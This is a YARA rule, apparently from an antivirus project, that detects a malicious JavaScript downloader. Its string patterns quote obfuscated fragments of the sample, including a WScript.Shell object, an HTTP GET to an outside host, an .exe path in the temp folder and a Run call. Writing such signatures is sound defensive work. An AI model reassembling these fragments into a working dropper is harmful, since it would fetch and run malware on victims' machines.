rule sig_20160328_3f3854ed3e9823bf6d043854c8807b12 {
  meta:
    description = "datamaliciousorder - file 20160328_3f3854ed3e9823bf6d043854c8807b12.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "58e965091c7587fa5eef98f824f8c9ebddd3dc97971e0621d0ce562af8619b2e"

  strings:
    $s1  = "function Hqvhmiuynf() {return Hylatt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"3ZI6xlpcnehxY.exe\";};" fullword ascii
    $s2  = "Duiwwxk[Tzyftyvg](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Vzaabkc](Butkun() * 11)} while (Duiwwxk[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Hylatt = function Xgyyjfzsu() {return WScript[Baawz](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Wplyp(Msfqozfob, Aaipqxqhn){return Msfqozfob - Aaipqxqhn;};" fullword ascii
    $s6  = "function Bjajjyp() {return ((Vbgcsihv == true) && (Vbgcsihv == Nsfxai)) ? 1 : Qvccdzwvx;};" fullword ascii
    $s7  = "function Mvswdcmi(Mdvsyktngf){Hylatt[\"Run\"](Mdvsyktngf, Qvccdzwvx, Qvccdzwvx);};" fullword ascii
    $s8  = "var Dfgjhdwkox = new this[\"Date\"]();" fullword ascii
    $s9  = "function Wkvrwmj(Ovwfnkst) {var Lqbzzjigd = (1, 2, 3, 4, 5, Ovwfnkst); return Lqbzzjigd;};" fullword ascii
    $s10 = "var Lttgo = false;" fullword ascii
    $s11 = "return Wplyp(Vmfiehmqp, Wblxkrzq);" fullword ascii
    $s12 = " while (Uvboie){" fullword ascii
    $s13 = "var Vbgcsihv = false;" fullword ascii
    $s14 = "Nsfxai = true; " fullword ascii
    $s15 = "Vbgcsihv = true; " fullword ascii
    $s16 = "function Butkun(){return 22;};" fullword ascii
    $s17 = "function Cftlzqe(){return Baawz;};" fullword ascii
    $s18 = "function Wmzip()" fullword ascii
    $s19 = "function Jpbyswqghg(){return Mpwnvnb;};" fullword ascii
    $s20 = "var Nsfxai = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}